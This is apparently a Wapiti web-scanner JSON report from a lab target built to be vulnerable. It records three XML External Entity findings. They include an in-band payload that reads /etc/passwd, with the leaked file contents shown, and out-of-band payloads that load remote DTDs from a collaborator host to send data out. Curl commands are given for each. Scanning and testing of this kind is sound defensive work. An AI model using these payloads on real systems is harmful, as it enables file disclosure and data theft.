{
    "vulnerabilities": {
        "Backup file": [],
        "Weak credentials": [],
        "CRLF Injection": [],
        "Content Security Policy Configuration": [],
        "Cross Site Request Forgery": [],
        "Potentially dangerous file": [],
        "Command execution": [],
        "Path Traversal": [],
        "Fingerprint web application framework": [],
        "Fingerprint web server": [],
        "Htaccess Bypass": [],
        "HTTP Secure Headers": [],
        "HttpOnly Flag cookie": [],
        "Log4Shell": [],
        "Open Redirect": [],
        "Reflected Cross Site Scripting": [],
        "Secure Flag cookie": [],
        "SQL Injection": [],
        "TLS/SSL misconfigurations": [],
        "Server Side Request Forgery": [],
        "Stored Cross Site Scripting": [],
        "Subdomain takeover": [],
        "Blind SQL Injection": [],
        "XML External Entity": [
            {
                "method": "POST",
                "path": "/xml_vuln_maker.php",
                "info": "XXE vulnerability leading to file disclosure",
                "level": 3,
                "parameter": "raw body",
                "referer": "",
                "module": "xxe",
                "http_request": "POST /xml_vuln_maker.php?filterword=passwd HTTP/1.1\nhost: xxe\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncontent-type: text/xml\ncontent-length: 134\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "curl_command": "curl \"http://xxe/xml_vuln_maker.php?filterword=passwd\" -H \"Content-Type: text/xml\" -d @payload_file",
                "wstg": [
                    "WSTG-INPV-07"
                ],
                "detail": {
                    "response": {
                        "status_code": 200,
                        "body": "<br />\n<b>Deprecated</b>:  Function libxml_disable_entity_loader() is deprecated in <b>/var/www/html/xml_vuln_maker.php</b> on line <b>5</b><br />\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY>\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<foo>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n</foo>\n\n",
                        "headers": [
                            [
                                "server",
                                "Apache/2.4.56 (Debian)"
                            ],
                            [
                                "x-powered-by",
                                "PHP/8.1.18"
                            ],
                            [
                                "vary",
                                "Accept-Encoding"
                            ],
                            [
                                "content-length",
                                "573"
                            ],
                            [
                                "keep-alive",
                                "timeout=5, max=73"
                            ],
                            [
                                "connection",
                                "Keep-Alive"
                            ],
                            [
                                "content-type",
                                "text/html; charset=UTF-8"
                            ]
                        ]
                    }
                }
            },
            {
                "method": "POST",
                "path": "/xml_vuln_maker.php",
                "info": "The target reached the DTD file on the endpoint but the exploitation didn't succeed.",
                "level": 2,
                "parameter": "raw body",
                "referer": "",
                "module": "xxe",
                "http_request": "POST /xml_vuln_maker.php HTTP/1.1\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY % remote SYSTEM \"http://endpoint/dtd/jsonnx/5/72617720626f6479/linux2.dtd\">\n%remote; %intern; %trick; ]>\n<xml><test>hello</test></xml>",
                "curl_command": "curl \"http://xxe/xml_vuln_maker.php\" -H \"Content-Type: text/xml\" -d @payload_file",
                "wstg": [
                    "WSTG-INPV-07"
                ],
                "detail": {
                    "response": null
                }
            },
            {
                "method": "POST",
                "path": "/xml_vuln_maker.php",
                "info": "Out-Of-Band XXE vulnerability by sending raw XML in request body\nThe target sent 922 bytes of data to the endpoint at 2023-06-06T15:14:11+00:00 with IP 172.19.0.19.\nReceived data can be seen at http://endpoint/xxe_data/jsonnx/5/72617720626f6479/1686064451-1-172.19.0.19.txt.",
                "level": 3,
                "parameter": "raw body",
                "referer": "",
                "module": "xxe",
                "http_request": "POST /xml_vuln_maker.php HTTP/1.1\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY % remote SYSTEM \"http://endpoint/dtd/jsonnx/5/72617720626f6479/linux.dtd\">\n%remote; %intern; %trick; ]>\n<xml><test>hello</test></xml>",
                "curl_command": "curl \"http://xxe/xml_vuln_maker.php\" -H \"Content-Type: text/xml\" -d @payload_file",
                "wstg": [
                    "WSTG-INPV-07"
                ],
                "detail": {
                    "response": null
                }
            }
        ]
    },
    "anomalies": {
        "Internal Server Error": [],
        "Resource consumption": []
    },
    "additionals": {
        "Fingerprint web technology": [],
        "HTTP Methods": []
    },
    "infos": {
        "target": "http://xxe/",
        "version": "Wapiti 3.1.7",
        "scope": "folder",
        "auth": null,
        "crawled_pages_nbr": 5,
        "crawled_pages": [
            {
                "request": {
                    "url": "http://xxe/",
                    "method": "GET",
                    "headers": [
                        [
                            "host",
                            "xxe"
                        ],
                        [
                            "connection",
                            "keep-alive"
                        ],
                        [
                            "user-agent",
                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
                        ],
                        [
                            "accept-language",
                            "en-US"
                        ],
                        [
                            "accept-encoding",
                            "gzip, deflate, br"
                        ],
                        [
                            "accept",
                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                        ]
                    ],
                    "referer": "",
                    "enctype": "",
                    "encoding": "UTF-8",
                    "depth": 0
                },
                "response": {
                    "status_code": 200,
                    "body": "<!DOCTYPE html>\n<html>\n<head>\n\t<title>Index</title>\n</head>\n<body>\n\t<h1>Index</h1>\n\t<p>This is a simple PHP web page.</p>\n    <ul>\n        <li><a href=\"./xml_vuln_maker.php?filterword=passwd\">link 1</a></li>\n        <li><a href=\"./xml_vuln_maker.php?filterword=networks\">link 2</a></li>\n        <li><a href=\"./xml_vuln_maker.php?filterword=linux\">link 3</a></li>\n    </ul>\n</body>\n</html>\n",
                    "headers": [
                        [
                            "server",
                            "Apache/2.4.56 (Debian)"
                        ],
                        [
                            "x-powered-by",
                            "PHP/8.1.18"
                        ],
                        [
                            "vary",
                            "Accept-Encoding"
                        ],
                        [
                            "content-encoding",
                            "gzip"
                        ],
                        [
                            "content-length",
                            "211"
                        ],
                        [
                            "keep-alive",
                            "timeout=5, max=100"
                        ],
                        [
                            "connection",
                            "Keep-Alive"
                        ],
                        [
                            "content-type",
                            "text/html; charset=UTF-8"
                        ]
                    ]
                }
            },
            {
                "request": {
                    "url": "http://xxe/xml_vuln_maker.php",
                    "method": "GET",
                    "headers": [
                        [
                            "host",
                            "xxe"
                        ],
                        [
                            "connection",
                            "keep-alive"
                        ],
                        [
                            "user-agent",
                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
                        ],
                        [
                            "accept-language",
                            "en-US"
                        ],
                        [
                            "accept-encoding",
                            "gzip, deflate, br"
                        ],
                        [
                            "accept",
                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                        ]
                    ],
                    "referer": "",
                    "enctype": "",
                    "encoding": "UTF-8",
                    "depth": 1
                },
                "response": {
                    "status_code": 200,
                    "body": "<!DOCTYPE html><html><head>    <title>XML Receiver</title></head><body>    <h1>XML Receiver</h1>    <a>This page accept XML as POST requests and will mirror it to you<a></body></html>",
                    "headers": [
                        [
                            "server",
                            "Apache/2.4.56 (Debian)"
                        ],
                        [
                            "x-powered-by",
                            "PHP/8.1.18"
                        ],
                        [
                            "vary",
                            "Accept-Encoding"
                        ],
                        [
                            "content-encoding",
                            "gzip"
                        ],
                        [
                            "content-length",
                            "151"
                        ],
                        [
                            "keep-alive",
                            "timeout=5, max=99"
                        ],
                        [
                            "connection",
                            "Keep-Alive"
                        ],
                        [
                            "content-type",
                            "text/html; charset=UTF-8"
                        ]
                    ]
                }
            },
            {
                "request": {
                    "url": "http://xxe/xml_vuln_maker.php",
                    "method": "GET",
                    "headers": [
                        [
                            "host",
                            "xxe"
                        ],
                        [
                            "connection",
                            "keep-alive"
                        ],
                        [
                            "user-agent",
                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
                        ],
                        [
                            "accept-language",
                            "en-US"
                        ],
                        [
                            "accept-encoding",
                            "gzip, deflate, br"
                        ],
                        [
                            "accept",
                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                        ]
                    ],
                    "referer": "",
                    "enctype": "",
                    "encoding": "UTF-8",
                    "depth": 1
                },
                "response": {
                    "status_code": 200,
                    "body": "<!DOCTYPE html><html><head>    <title>XML Receiver</title></head><body>    <h1>XML Receiver</h1>    <a>This page accept XML as POST requests and will mirror it to you<a></body></html>",
                    "headers": [
                        [
                            "server",
                            "Apache/2.4.56 (Debian)"
                        ],
                        [
                            "x-powered-by",
                            "PHP/8.1.18"
                        ],
                        [
                            "vary",
                            "Accept-Encoding"
                        ],
                        [
                            "content-encoding",
                            "gzip"
                        ],
                        [
                            "content-length",
                            "151"
                        ],
                        [
                            "keep-alive",
                            "timeout=5, max=100"
                        ],
                        [
                            "connection",
                            "Keep-Alive"
                        ],
                        [
                            "content-type",
                            "text/html; charset=UTF-8"
                        ]
                    ]
                }
            },
            {
                "request": {
                    "url": "http://xxe/xml_vuln_maker.php",
                    "method": "GET",
                    "headers": [
                        [
                            "host",
                            "xxe"
                        ],
                        [
                            "connection",
                            "keep-alive"
                        ],
                        [
                            "user-agent",
                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
                        ],
                        [
                            "accept-language",
                            "en-US"
                        ],
                        [
                            "accept-encoding",
                            "gzip, deflate, br"
                        ],
                        [
                            "accept",
                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                        ]
                    ],
                    "referer": "",
                    "enctype": "",
                    "encoding": "UTF-8",
                    "depth": 1
                },
                "response": {
                    "status_code": 200,
                    "body": "<!DOCTYPE html><html><head>    <title>XML Receiver</title></head><body>    <h1>XML Receiver</h1>    <a>This page accept XML as POST requests and will mirror it to you<a></body></html>",
                    "headers": [
                        [
                            "server",
                            "Apache/2.4.56 (Debian)"
                        ],
                        [
                            "x-powered-by",
                            "PHP/8.1.18"
                        ],
                        [
                            "vary",
                            "Accept-Encoding"
                        ],
                        [
                            "content-encoding",
                            "gzip"
                        ],
                        [
                            "content-length",
                            "151"
                        ],
                        [
                            "keep-alive",
                            "timeout=5, max=100"
                        ],
                        [
                            "connection",
                            "Keep-Alive"
                        ],
                        [
                            "content-type",
                            "text/html; charset=UTF-8"
                        ]
                    ]
                }
            },
            {
                "request": {
                    "url": "http://xxe/xml_vuln_maker.php",
                    "method": "GET",
                    "headers": [
                        [
                            "host",
                            "xxe"
                        ],
                        [
                            "connection",
                            "keep-alive"
                        ],
                        [
                            "user-agent",
                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
                        ],
                        [
                            "accept-language",
                            "en-US"
                        ],
                        [
                            "accept-encoding",
                            "gzip, deflate, br"
                        ],
                        [
                            "accept",
                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                        ]
                    ],
                    "referer": "",
                    "enctype": "",
                    "encoding": "UTF-8",
                    "depth": 1
                },
                "response": {
                    "status_code": 200,
                    "body": "<!DOCTYPE html><html><head>    <title>XML Receiver</title></head><body>    <h1>XML Receiver</h1>    <a>This page accept XML as POST requests and will mirror it to you<a></body></html>",
                    "headers": [
                        [
                            "server",
                            "Apache/2.4.56 (Debian)"
                        ],
                        [
                            "x-powered-by",
                            "PHP/8.1.18"
                        ],
                        [
                            "vary",
                            "Accept-Encoding"
                        ],
                        [
                            "content-encoding",
                            "gzip"
                        ],
                        [
                            "content-length",
                            "151"
                        ],
                        [
                            "keep-alive",
                            "timeout=5, max=100"
                        ],
                        [
                            "connection",
                            "Keep-Alive"
                        ],
                        [
                            "content-type",
                            "text/html; charset=UTF-8"
                        ]
                    ]
                }
            }
        ],
        "detailed_report": true
    }
}